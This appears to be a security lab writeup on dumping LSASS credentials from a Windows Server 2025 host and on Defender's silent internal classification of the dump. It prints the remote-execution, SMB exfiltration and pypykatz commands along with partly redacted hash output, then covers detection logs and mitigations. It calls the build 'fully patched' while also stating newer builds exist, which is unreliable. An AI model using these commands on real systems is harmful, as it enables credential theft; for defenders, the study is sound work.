# LSASS Minidump Parsing Remains Viable on Windows Server 2025 (UBR 1742)

**Date:** 2026-04-29  
**Host:** WIN-52H4TKKPD9C (Windows Server 2025, Build 26100, UBR 1742)  
**Defender Signatures:** 1.449.353.0 (current as of test date)  
**Tooling:** goexec (tsch), curio.exe (MiniDumpWriteDump via dbghelp.dll), smbclient, pypykatz  
**Phase:** Credential extraction baseline — no detection engineering in scope for this run

---

## Research Scope

This writeup focuses on detection engineering and Microsoft Defender telemetry behaviour, not tool development.
The technique is described at the API level using publicly documented Windows functionality. No tooling or compiled binaries are provided.
No vulnerability or security boundary bypass was identified. This research examines how Defender responds to specific credential access patterns and where visibility diverges from enforcement.
The goal is to clarify detection boundaries for defenders.

> **Assumed breach conditions apply throughout.** 
Local administrator access on the target host is a prerequisite for all techniques described. This research does not cover initial access.

## Objective

Determine whether pypykatz can successfully parse an LSASS minidump exfiltrated from a fully patched Windows Server 2025 host at UBR 1742, with current Defender signatures active and no Credential Guard configured.

This is a **baseline test** — telemetry and detection rule validation are out of scope here. The singular question: *does the tooling work against a current build?*

---

## Environment

| Property | Value |
|---|---|
| OS | Windows Server 2025 |
| Build | 26100 |
| UBR | 1742 |
| Defender Signatures | 1.449.353.0 |
| Credential Guard | Not configured |
| RunAsPPL | Not enabled (baseline) |
| Host type | Standalone (WORKGROUP) |
| Local user | `ubuntu` |

---

## Attack Chain

### 1. Dump Delivery — Scheduled Task via goexec (tsch)

A base64-encoded PowerShell payload was delivered via `goexec` using the Task Scheduler (`tsch`) module. The payload executed `curio.exe` — a compiled binary calling `MiniDumpWriteDump` directly via `dbghelp.dll` — against the LSASS process, writing output to `C:\Windows\Temp\out2.dmp`. The `comsvcs.dll`/`rundll32` invocation path was not used — it is blocked by Defender at process creation and was not attempted.

```bash
# [Kali]
./goexec tsch create 192.168.1.52 \
  -u 'ubuntu' \
  -p 'xxx****' \
  --task '\systemshell' \
  --exec 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' \
  --args "-NoP -NonI -W Hidden -Enc $ENCODED"
```

The task was configured to self-delete after execution. Dump completed in approximately 32 minutes (09:28 → 10:00 AM). Final dump size: **53,204 KB**.

### 2. Exfiltration — SMB Pull

```bash
# [Kali]
smbclient //192.168.1.52/C$ -U 'ubuntu%xxx****' \
  -c 'get Windows\Temp\out2.dmp /tmp/out290425_SERVER_2025PATCHED_UBR_1742.dmp'
```

Transfer rate: ~369 MB/s (LAN, VMware host-only network).

### 3. Parsing — pypykatz offline

```bash
# [Kali]
pypykatz lsa minidump /tmp/out290425_SERVER_2025PATCHED_UBR_1742.dmp
```

---

## Results

### MSV — NT Hash Extracted ✅

```
== LogonSession ==
username        : ubuntu
domainname      : WIN-52H4TKKPD9C
LM              : NA
NT              : 3c0****************************
SHA1            : af6************************************
DPAPI           : af6************************************
```

NT hash is present and parseable. LM is NA (expected — disabled by default on Server 2025).

### WDigest — Cleartext Not Present ✅ (protection holds)

```
== WDIGEST ==
username        : ubuntu
domainname      : WIN-52H4TKKPD9C
password        : None
```

`UseLogonCredential = 0` is the default on Server 2025. WDigest cleartext is not cached. This protection works as intended.

### DPAPI Masterkeys — Present ✅

Two DPAPI masterkeys were recovered across the two `ubuntu` logon sessions:

| LUID | Key GUID |
|---|---|
| 412375 | 4648f146-c945-4aa3-b060-8f159e973daa |
| 412419 | (second logon session) |

Masterkeys are actionable for offline DPAPI blob decryption where the user's password or domain backup key is known.

### Kerberos

No domain — WORKGROUP host. No TGTs or service tickets in LSASS. Expected.

---

## Key Observations

### What worked
- `curio.exe` (`MiniDumpWriteDump` via `dbghelp.dll`) via scheduled task delivery succeeded against Server 2025 at UBR 1742 with current Defender signatures
- No observable structural changes in LSASS memory (MSV/DPAPI providers) impacted parsing on Server 2025 UBR 1742. pypykatz parsed the dump without issue.
- SMB exfiltration of a 53 MB dump is trivially fast on a LAN segment

### What didn't yield cleartext
- WDigest is suppressed by default — cleartext password not cached
- No Kerberos tickets (standalone host, no domain)

### What was not tested in this run
- **PPL (RunAsPPL)** — this is the next phase. With `RunAsPPL=2` enabled, the handle-open against LSASS should fail at the OS level, preventing standard handle-based dump generation. pypykatz parsing is irrelevant if the dump cannot be created.
- **Credential Guard** — would encrypt MSV secrets using VSM, rendering the NT hash unreadable even from a valid dump
- **Detection telemetry** — ELK/Kibana detection rules (Sysmon EID 1, EID 10, PowerShell logging) are not instrumented for this run. Detection coverage will be validated in a subsequent dedicated session.

---

## Takeaway

Windows Server 2025 at current patch levels (UBR 1742) does not prevent LSASS dump parsing by default. WDigest cleartext protection holds. MSV NT hashes do not.

The realistic mitigations that would have changed this outcome:

| Control | Effect |
|---|---|
| **RunAsPPL = 2** | Blocks handle-open; prevents standard handle-based dump generation |
| **Credential Guard** | Encrypts MSV secrets in VSM; NT hash unreadable from dump |
| **LSA Protection audit** | EID 3065/3066 surface PPL enforcement state and bypass attempts |
| **Both PPL + CG** | Defense in depth — handle blocked AND secrets encrypted |

Neither was enabled in this baseline. The dump was created, exfiltrated, and parsed successfully with standard open-source tooling.

---

## Defender Log Analysis

Post-execution review of the Microsoft Defender Antivirus operational log confirmed zero detections across the entire attack window (09:28–10:00 AM).

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" |
  Where-Object { $_.TimeCreated -gt (Get-Date).AddHours(-4) } |
  Select-Object TimeCreated, Id, Message |
  Format-List
```

### Events observed

| Time | Event ID | Explanation |
|---|---|---|
| 09:19–09:20 | **2001** | Signature update failed (0x80072ee7 — DNS resolution failure). Network adapter was offline to prevent KB5082063 download. Expected. |
| 09:20 | **2000** | Signature update succeeded to 1.449.353.0 via `MpCmdRun -SignatureUpdate` (separate CDN path). |
| 09:09 / 09:22 | **5007** | Config changes reflecting service restarts and WdConfigHash rotation. Artefacts of `wuauserv`/`bits` service disruption and exclusion path addition. |
| 10:00 | **3002** | RTP filter driver entered pass-through mode (0x80004005 — unspecified error). |
| 10:01 | **3007** | RTP filter driver recovered and resumed scanning. |

### No detections

Event IDs **1116** (threat detected), **1117** (action taken), **1006/1007** (scan finding), and **1015** (suspicious behaviour) are entirely absent from the log.

### Notable: RTP pass-through at dump completion

EID 3002 fired at **10:00:58 AM** — the exact minute the dump completed writing. The RTP filter driver briefly entered pass-through mode, meaning on-access scanning was suspended. This condition was not intentionally introduced and is attributed to earlier service disruption in the lab environment. It is worth noting regardless: even if Defender held a behavioural signature for `MiniDumpWriteDump` activity, the RTP engine was momentarily blind at the precise moment the dump file reached its final size. A clean run with uninterrupted RTP is required to fully validate detection coverage.

**Conclusion: No Defender detections were observed for this technique under the tested conditions (signature 1.449.353.0, Server 2025 UBR 1742) — even when RTP was active during most of the execution window.**

---

## ETW Engine Trace Analysis

To gain visibility into Defender's internal behaviour during the dump write, the `Microsoft-Antimalware-Engine` ETW provider was captured across the execution window.

```powershell
# [Victim VM — PowerShell as Admin]
logman start DefenderTrace `
  -p "Microsoft-Antimalware-Engine" `
  -o C:\Windows\Temp\defendertrace.etl `
  -ets

# ... run dump ...

logman stop DefenderTrace -ets

tracerpt C:\Windows\Temp\defendertrace.etl `
  -o C:\Windows\Temp\defendertrace.xml `
  -of XML
```

### Key findings

**1. Behavioural classification — threat named, no action taken**

Buried in the trace, a single entry:

```xml
<Data Name="VName">Behavior:Win32/LsassDump.AK</Data>
```

Defender's behavioural engine internally classified the dump activity as `Behavior:Win32/LsassDump.AK` — a named detection. This never produced an EID 1116 or 1117 in the operational log. The engine observed the behaviour, assigned it a threat name, and produced no external signal. No remediation. No alert. No operational event.

This is the most significant finding of this session. It is not a detection gap in the conventional sense — Defender did not miss the activity. It observed it, classified it, and chose (or failed) to act. The gap is between internal classification and external telemetry emission.

**2. Continuous AMSI memory stream scanning during write**

The trace shows sustained AMSI stream scan requests against memory regions throughout the dump write window:

```xml
<Data Name="Path">MemScanVfz-AMSI-865F9243-FA9B-220B-CFC4-1240285F9144</Data>
<Task>Stream scan request</Task>
<Message>Start of stream scan request</Message>
<Data Name="FirstParam">AmsiScan</Data>
...
<Message>End of stream scan request</Message>
```

These repeat continuously — dozens of scan start/end pairs across multiple AMSI GUIDs. This is the mechanism behind the extended write time observed in Vector 7 (30–45 minutes). Defender is intercepting memory chunks as `MiniDumpWriteDump` streams them to disk and submitting each for inspection. The write completes, but at heavily degraded throughput.

**3. ScanResult values**

| ScanResult | Meaning | Context |
|---|---|---|
| `2` | Clean / no threat | AMSI stream scans throughout write |
| `5` | Threat found, action deferred | Engine scan requests (ScanSource 34) |

`ScanResult=5` on engine scans (source 34) is consistent with the `Behavior:Win32/LsassDump.AK` classification — threat identified, no blocking action taken.

**4. `reason=max_scan` — inspection budget exhausted**

```xml
<Data Name="FirstParam">sigseq=0x85b351bc4771;level=M;reason=max_scan;scancnt=2</Data>
<Data Name="FirstParam">sigseq=0x85b351bc4771;level=1;reason=max_scan;scancnt=1</Data>
```

Defender hit its per-scan-cycle limit on some memory regions and stopped inspecting further chunks. The dump file size (53 MB) exceeded the engine's inspection budget for continuous streaming scans. This is a second contributing factor to the detection gap — beyond the classification-without-action problem, portions of the dump were not fully inspected due to scan count limits.

**5. Recurring RTP pass-through (3002/3007) — environmental instability confirmed**

A second 3002/3007 pair fired at **12:16–12:17 PM** — well after the dump completed and with no attack activity in progress. This confirms the RTP filter driver instability is a recurring VM resource issue, not correlated with dump activity. The 10:00 AM pass-through at dump completion was coincidental, not causal.

### Interpretation

The ETW trace resolves the question left open by the operational log. Defender was not simply unaware of the activity — it was actively engaged: scanning memory chunks via AMSI, running engine scans, and internally classifying the behaviour as `Behavior:Win32/LsassDump.AK`. The absence of operational log events (1116/1117) means the classification did not cross whatever internal threshold triggers remediation and telemetry emission.

Three contributing factors to the silent outcome:

1. **Classification without remediation** — `Behavior:Win32/LsassDump.AK` was named internally but never acted upon
2. **Scan budget exhaustion** — `max_scan` indicates portions of the dump stream were not fully inspected
3. **RTP pass-through at completion** — filter driver was momentarily blind at the precise moment the file reached final size

None of these individually explain the outcome. Together they describe a behavioural enforcement layer that observed the activity, partially inspected it, classified it, and emitted no external signal. The full ETW trace is appended below as a raw artifact.

---

## Files

| File | Description |
|---|---|
| `out290425_SERVER_2025PATCHED_UBR_1742.dmp` | Raw LSASS minidump (not uploaded — contains credentials) |
| `pypykatz_output.txt` | Raw parser output (sanitized — hashes redacted) |

---

## Parsing Boundary Note

pypykatz parsing confirmed broken on build **26100.32370** (KB5075899, February 10, 2026) — see [skelsec/pypykatz#191](https://github.com/skelsec/pypykatz/issues/191). Reporters observed that dumps could still be created at that patch level, but MSV and Kerberos structure extraction failed with `msv_exception_please_report`. Microsoft appears to have modified internal LSASS data structures or offsets in that cumulative update, breaking pypykatz's parsing templates.

**UBR 1742 (November 2024 GA build) represents the last fully validated baseline prior to this structural change.** This writeup documents that boundary.

A community-developed alternative, [LsaParser (KvcForensic)](https://github.com/wesmar/KvcForensic), uses a scoring-based layout detector (`DetectSessionFieldLayout`) that probes candidate struct offsets dynamically against live memory content rather than relying on hardcoded signatures. It is reported to handle post-1742 builds including 26100.32370+. For researchers working at higher patch levels where pypykatz fails, this is the current viable alternative.

---

## References

- [pypykatz](https://github.com/skelsec/pypykatz)
- [pypykatz issue #191 — MSV/Kerberos parsing failure on 26100.32370](https://github.com/skelsec/pypykatz/issues/191)
- [goexec](https://github.com/bachimanchi/goexec)
- [Microsoft — MiniDumpWriteDump](https://learn.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump)
- [Microsoft — Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/)
- [Microsoft — RunAsPPL](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)

---

Screenshots:

<img width="679" height="704" alt="DMPFILE" src="https://github.com/user-attachments/assets/e2e5118a-5f6d-4956-8157-3aa85d92558a" />

<img width="1879" height="943" alt="UBR1742ATTACKLINKEDIN" src="https://github.com/user-attachments/assets/55803d95-1494-4b0f-8bee-a5acdb00fb32" />

<img width="1870" height="943" alt="UBR1742ATTACKWITHPTH" src="https://github.com/user-attachments/assets/b00716a8-a592-4639-b3ee-9502c542f66a" />

- <img width="1858" height="925" alt="defendertelemetrydump" src="https://github.com/user-attachments/assets/2fb133c7-4fb8-402e-b3d9-15bb8b3cebb3" />

---

PS C:\WINDOWS\system32> Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" |
>>   Where-Object { $_.TimeCreated -gt (Get-Date).AddHours(-4) } |
>>   Select-Object TimeCreated, Id, Message |
>>   Format-List


TimeCreated : 4/29/2026 10:01:59 AM
Id          : 3007
Message     : Microsoft Defender Antivirus Real-time Protection feature has restarted. It is
              recommended that you run a full system scan to detect any items that may have
              been missed while this agent was down.
                Feature: On Access
                Reason: The filter driver has restarted scanning items and is out of pass
              through mode.

TimeCreated : 4/29/2026 10:00:58 AM
Id          : 3002
Message     : Microsoft Defender Antivirus Real-Time Protection feature has encountered an
              error and failed.
                Feature: On Access
                Error Code: 0x80004005
                Error description: Unspecified error
                Reason: The filter driver skipped scanning items and is in pass through
              mode. This may be due to low resource conditions.

TimeCreated : 4/29/2026 9:23:35 AM
Id          : 5007
Message     : Microsoft Defender Antivirus Configuration has changed. If this is an
              unexpected event you should review the settings as this may be the result of
              malware.
                Old value: HKLM\SOFTWARE\Microsoft\Windows Defender\ServiceStartStates = 0x1
                New value: Default\ServiceStartStates = 0x0

TimeCreated : 4/29/2026 9:22:42 AM
Id          : 5007
Message     : Microsoft Defender Antivirus Configuration has changed. If this is an
              unexpected event you should review the settings as this may be the result of
              malware.
                Old value: HKLM\SOFTWARE\Microsoft\Windows
              Defender\Diagnostics\InitializingComponentProgress = LoadingEngine
                New value: HKLM\SOFTWARE\Microsoft\Windows
              Defender\Diagnostics\InitializingComponentProgress = ServiceStartedSuccessfully

TimeCreated : 4/29/2026 9:22:42 AM
Id          : 5007
Message     : Microsoft Defender Antivirus Configuration has changed. If this is an
              unexpected event you should review the settings as this may be the result of
              malware.
                Old value: HKLM\SOFTWARE\Microsoft\Windows Defender\CoreService\WdConfigHash
              = 0x1ADAC0BC
                New value: HKLM\SOFTWARE\Microsoft\Windows Defender\CoreService\WdConfigHash
              = 0x194C897

TimeCreated : 4/29/2026 9:22:39 AM
Id          : 5007
Message     : Microsoft Defender Antivirus Configuration has changed. If this is an
              unexpected event you should review the settings as this may be the result of
              malware.
                Old value: HKLM\SOFTWARE\Microsoft\Windows
              Defender\Diagnostics\InitializingComponentProgress = InitEventConfig
                New value: HKLM\SOFTWARE\Microsoft\Windows
              Defender\Diagnostics\InitializingComponentProgress = LoadingEngine

TimeCreated : 4/29/2026 9:22:39 AM
Id          : 5007
Message     : Microsoft Defender Antivirus Configuration has changed. If this is an
              unexpected event you should review the settings as this may be the result of
              malware.
                Old value: HKLM\SOFTWARE\Microsoft\Windows
              Defender\Diagnostics\InitializingComponentProgress = PostPlatformUpdate
                New value: HKLM\SOFTWARE\Microsoft\Windows
              Defender\Diagnostics\InitializingComponentProgress = InitEventConfig

TimeCreated : 4/29/2026 9:22:39 AM
Id          : 5007
Message     : Microsoft Defender Antivirus Configuration has changed. If this is an
              unexpected event you should review the settings as this may be the result of
              malware.
                Old value: Default\ServiceStartStates = 0x0
                New value: HKLM\SOFTWARE\Microsoft\Windows Defender\ServiceStartStates = 0x1

TimeCreated : 4/29/2026 9:22:38 AM
Id          : 5007
Message     : Microsoft Defender Antivirus Configuration has changed. If this is an
              unexpected event you should review the settings as this may be the result of
              malware.
                Old value: HKLM\SOFTWARE\Microsoft\Windows
              Defender\Diagnostics\InitializingComponentProgress =
              InitializeMiscConfigLibrary
                New value: HKLM\SOFTWARE\Microsoft\Windows
              Defender\Diagnostics\InitializingComponentProgress = PostPlatformUpdate

TimeCreated : 4/29/2026 9:22:38 AM
Id          : 5007
Message     : Microsoft Defender Antivirus Configuration has changed. If this is an
              unexpected event you should review the settings as this may be the result of
              malware.
                Old value: HKLM\SOFTWARE\Microsoft\Windows Defender\CoreService\WdConfigHash
              = 0x194C897
                New value: HKLM\SOFTWARE\Microsoft\Windows Defender\CoreService\WdConfigHash
              = 0x1ADAC0BC

TimeCreated : 4/29/2026 9:22:38 AM
Id          : 5007
Message     : Microsoft Defender Antivirus Configuration has changed. If this is an
              unexpected event you should review the settings as this may be the result of
              malware.
                Old value: Default\IsServiceRunning = 0x0
                New value: HKLM\SOFTWARE\Microsoft\Windows Defender\IsServiceRunning = 0x1

TimeCreated : 4/29/2026 9:20:48 AM
Id          : 5007
Message     : Microsoft Defender Antivirus Configuration has changed. If this is an
              unexpected event you should review the settings as this may be the result of
              malware.
                Old value: HKLM\SOFTWARE\Microsoft\Windows
              Defender\Diagnostics\LastSignatureUpdateResult = 0x80072EE7
                New value: HKLM\SOFTWARE\Microsoft\Windows
              Defender\Diagnostics\LastSignatureUpdateResult = 0x0

TimeCreated : 4/29/2026 9:20:48 AM
Id          : 5007
Message     : Microsoft Defender Antivirus Configuration has changed. If this is an
              unexpected event you should review the settings as this may be the result of
              malware.
                Old value: HKLM\SOFTWARE\Microsoft\Windows Defender\CoreService\WdConfigHash
              = 0x2838C031
                New value: HKLM\SOFTWARE\Microsoft\Windows Defender\CoreService\WdConfigHash
              = 0x194C897

TimeCreated : 4/29/2026 9:20:47 AM
Id          : 2000
Message     : Microsoft Defender Antivirus security intelligence version updated.
                Current security intelligence Version: 1.449.353.0
                Previous security intelligence Version: 1.449.328.0
                Security intelligence Type: AntiSpyware
                Update Type: Delta
                User: NT AUTHORITY\SYSTEM
                Current Engine Version: 1.1.26030.3008
                Previous Engine Version: 1.1.26030.3008

TimeCreated : 4/29/2026 9:20:47 AM
Id          : 2000
Message     : Microsoft Defender Antivirus security intelligence version updated.
                Current security intelligence Version: 1.449.353.0
                Previous security intelligence Version: 1.449.328.0
                Security intelligence Type: AntiVirus
                Update Type: Delta
                User: NT AUTHORITY\SYSTEM
                Current Engine Version: 1.1.26030.3008
                Previous Engine Version: 1.1.26030.3008

TimeCreated : 4/29/2026 9:19:33 AM
Id          : 5007
Message     : Microsoft Defender Antivirus Configuration has changed. If this is an
              unexpected event you should review the settings as this may be the result of
              malware.
                Old value: HKLM\SOFTWARE\Microsoft\Windows
              Defender\Diagnostics\LastSignatureUpdateResult = 0x0
                New value: HKLM\SOFTWARE\Microsoft\Windows
              Defender\Diagnostics\LastSignatureUpdateResult = 0x80072EE7

TimeCreated : 4/29/2026 9:19:33 AM
Id          : 2001
Message     : Microsoft Defender Antivirus has encountered an error trying to update
              security intelligence.
                New security intelligence Version:
                Previous security intelligence Version: 1.449.328.0
                Update Source: Microsoft Malware Protection Center
                Security intelligence Type: AntiVirus
                Update Type: Full
                User: NT AUTHORITY\SYSTEM
                Current Engine Version:
                Previous Engine Version: 1.1.26030.3008
                Error code: 0x80072ee7
                Error description: The server name or address could not be resolved

TimeCreated : 4/29/2026 9:19:33 AM
Id          : 2001
Message     : Microsoft Defender Antivirus has encountered an error trying to update
              security intelligence.
                New security intelligence Version:
                Previous security intelligence Version: 1.449.328.0
                Update Source: Microsoft Malware Protection Center
                Security intelligence Type: AntiSpyware
                Update Type: Full
                User: NT AUTHORITY\SYSTEM
                Current Engine Version:
                Previous Engine Version: 1.1.26030.3008
                Error code: 0x80072ee7
                Error description: The server name or address could not be resolved

TimeCreated : 4/29/2026 9:19:33 AM
Id          : 2001
Message     : Microsoft Defender Antivirus has encountered an error trying to update
              security intelligence.
                New security intelligence Version:
                Previous security intelligence Version: 1.449.328.0
                Update Source: Microsoft Malware Protection Center
                Security intelligence Type: AntiVirus
                Update Type: Full
                User: NT AUTHORITY\SYSTEM
                Current Engine Version:
                Previous Engine Version: 1.1.26030.3008
                Error code: 0x80072ee7
                Error description: The server name or address could not be resolved

TimeCreated : 4/29/2026 9:19:33 AM
Id          : 2001
Message     : Microsoft Defender Antivirus has encountered an error trying to update
              security intelligence.
                New security intelligence Version:
                Previous security intelligence Version: 1.449.328.0
                Update Source: Microsoft Malware Protection Center
                Security intelligence Type: AntiVirus
                Update Type: Full
                User: NT AUTHORITY\SYSTEM
                Current Engine Version:
                Previous Engine Version: 1.1.26030.3008
                Error code: 0x80072ee7
                Error description: The server name or address could not be resolved

TimeCreated : 4/29/2026 9:19:33 AM
Id          : 2001
Message     : Microsoft Defender Antivirus has encountered an error trying to update
              security intelligence.
                New security intelligence Version:
                Previous security intelligence Version: 1.449.328.0
                Update Source: Microsoft Malware Protection Center
                Security intelligence Type: AntiSpyware
                Update Type: Full
                User: NT AUTHORITY\SYSTEM
                Current Engine Version:
                Previous Engine Version: 1.1.26030.3008
                Error code: 0x80072ee7
                Error description: The server name or address could not be resolved

TimeCreated : 4/29/2026 9:19:33 AM
Id          : 2001
Message     : Microsoft Defender Antivirus has encountered an error trying to update
              security intelligence.
                New security intelligence Version:
                Previous security intelligence Version: 1.449.328.0
                Update Source: Microsoft Malware Protection Center
                Security intelligence Type: AntiVirus
                Update Type: Full
                User: NT AUTHORITY\SYSTEM
                Current Engine Version:
                Previous Engine Version: 1.1.26030.3008
                Error code: 0x80072ee7
                Error description: The server name or address could not be resolved

TimeCreated : 4/29/2026 9:14:57 AM
Id          : 5007
Message     : Microsoft Defender Antivirus Configuration has changed. If this is an
              unexpected event you should review the settings as this may be the result of
              malware.
                Old value: N/A\SpyNet\LastMAPSFailureTimeString =
                New value: HKLM\SOFTWARE\Microsoft\Windows
              Defender\SpyNet\LastMAPSFailureTimeString = 2026-04-29T06:14:57Z

TimeCreated : 4/29/2026 9:10:00 AM
Id          : 5007
Message     : Microsoft Defender Antivirus Configuration has changed. If this is an
              unexpected event you should review the settings as this may be the result of
              malware.
                Old value: HKLM\SOFTWARE\Microsoft\Windows Defender\ServiceStartStates = 0x1
                New value: Default\ServiceStartStates = 0x0

TimeCreated : 4/29/2026 9:09:34 AM
Id          : 5007
Message     : Microsoft Defender Antivirus Configuration has changed. If this is an
              unexpected event you should review the settings as this may be the result of
              malware.
                Old value: HKLM\SOFTWARE\Microsoft\Windows
              Defender\Diagnostics\InitializingComponentProgress = LoadingEngine
                New value: HKLM\SOFTWARE\Microsoft\Windows
              Defender\Diagnostics\InitializingComponentProgress = ServiceStartedSuccessfully

TimeCreated : 4/29/2026 9:09:34 AM
Id          : 5007
Message     : Microsoft Defender Antivirus Configuration has changed. If this is an
              unexpected event you should review the settings as this may be the result of
              malware.
                Old value: HKLM\SOFTWARE\Microsoft\Windows Defender\CoreService\WdConfigHash
              = 0x3376C81A
                New value: HKLM\SOFTWARE\Microsoft\Windows Defender\CoreService\WdConfigHash
              = 0x2838C031

TimeCreated : 4/29/2026 9:09:30 AM
Id          : 5007
Message     : Microsoft Defender Antivirus Configuration has changed. If this is an
              unexpected event you should review the settings as this may be the result of
              malware.
                Old value: HKLM\SOFTWARE\Microsoft\Windows
              Defender\Diagnostics\InitializingComponentProgress = PostPlatformUpdate
                New value: HKLM\SOFTWARE\Microsoft\Windows
              Defender\Diagnostics\InitializingComponentProgress = LoadingEngine

TimeCreated : 4/29/2026 9:09:30 AM
Id          : 5007
Message     : Microsoft Defender Antivirus Configuration has changed. If this is an
              unexpected event you should review the settings as this may be the result of
              malware.
                Old value: Default\ServiceStartStates = 0x0
                New value: HKLM\SOFTWARE\Microsoft\Windows Defender\ServiceStartStates = 0x1

TimeCreated : 4/29/2026 9:09:29 AM
Id          : 5007
Message     : Microsoft Defender Antivirus Configuration has changed. If this is an
              unexpected event you should review the settings as this may be the result of
              malware.
                Old value: HKLM\SOFTWARE\Microsoft\Windows
              Defender\Diagnostics\InitializingComponentProgress =
              InitializeMiscConfigLibrary
                New value: HKLM\SOFTWARE\Microsoft\Windows
              Defender\Diagnostics\InitializingComponentProgress = PostPlatformUpdate

TimeCreated : 4/29/2026 9:09:29 AM
Id          : 5007
Message     : Microsoft Defender Antivirus Configuration has changed. If this is an
              unexpected event you should review the settings as this may be the result of
              malware.
                Old value: HKLM\SOFTWARE\Microsoft\Windows Defender\CoreService\WdConfigHash
              = 0x2838C031
                New value: HKLM\SOFTWARE\Microsoft\Windows Defender\CoreService\WdConfigHash
              = 0x3376C81A

TimeCreated : 4/29/2026 9:09:29 AM
Id          : 5007
Message     : Microsoft Defender Antivirus Configuration has changed. If this is an
              unexpected event you should review the settings as this may be the result of
              malware.
                Old value: Default\IsServiceRunning = 0x0
                New value: HKLM\SOFTWARE\Microsoft\Windows Defender\IsServiceRunning = 0x1
### DEFENDER TELEMETRY DUMP

		<Data Name="Path">MemScanVfz-AMSI-865F9243-FA9B-220B-CFC4-1240285F9144</Data>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Data Name="FirstParam">AmsiScan</Data>
		<Data Name="Path">MemScanVfz-AMSI-865F9243-FA9B-220B-CFC4-1240285F9144</Data>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Data Name="ScanReason">7</Data>
		<Opcode>SmsScanStart</Opcode>
		<Task>SmsScanTask</Task>
		<Data Name="ScanReason">7</Data>
		<Data Name="ScanResult">2</Data>
		<Opcode>SmsScanStop</Opcode>
		<Task>SmsScanTask</Task>
		<Data Name="ScanSource">       0</Data>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Data Name="Path">MemScanVfz-AMSI-9DDAE638-4B7D-D99C-A138-1F7724BC2826</Data>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Data Name="FirstParam">AmsiScan</Data>
		<Data Name="Path">MemScanVfz-AMSI-9DDAE638-4B7D-D99C-A138-1F7724BC2826</Data>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Data Name="ScanReason">3</Data>
		<Opcode>SmsScanStart</Opcode>
		<Task>SmsScanTask</Task>
		<Data Name="ScanReason">3</Data>
		<Data Name="ScanResult">2</Data>
		<Opcode>SmsScanStop</Opcode>
		<Task>SmsScanTask</Task>
		<Data Name="ScanReason">4</Data>
		<Opcode>SmsScanStart</Opcode>
		<Task>SmsScanTask</Task>
		<Data Name="ScanReason">4</Data>
		<Data Name="ScanResult">2</Data>
		<Opcode>SmsScanStop</Opcode>
		<Task>SmsScanTask</Task>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Data Name="ScanSource">       0</Data>
		<Task>Stream scan request </Task>
		<Message>Start of stream scan request </Message>
		<Task>Stream scan request </Task>
		<Message>End of stream scan request </Message>
		<Data Name="ScanSource">       0</Data>
